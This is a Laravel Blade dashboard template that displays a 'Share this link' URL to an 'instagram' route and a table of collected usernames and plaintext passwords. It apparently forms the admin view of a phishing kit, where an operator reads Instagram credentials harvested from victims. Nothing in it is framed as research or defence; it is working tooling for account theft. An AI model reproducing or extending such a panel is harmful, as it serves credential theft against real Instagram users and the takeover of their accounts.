@extends('layouts.dashboard')

@section('content')

<div class="row">
        <div class="col-md-12">
            <div class="card">
                <div class="card-header">{{ __('Instagram') }}
                <p><strong>Share this link: </strong><a href="{{ route('instagram') }}" target="_blank" rel="noopener noreferrer">{{ route('instagram') }}</a></p>
                </div>

                
                    
                <table class="table table-bordered table-striped table-hover">
                    <thead>
                        <tr>
                            <th>Username</th>
                            <th>password</th>
                        </tr>
                    </thead>
                    <tbody>
                        @foreach ($dataInstagram as $dataI)
                        <tr>
                            <td>{{ $dataI->username }}</td>
                            <td>{{ $dataI->password }}</td>
                        </tr>
                        @endforeach
                    </tbody>
                </table>

                
            </div>
        </div>
    </div>

@endsection
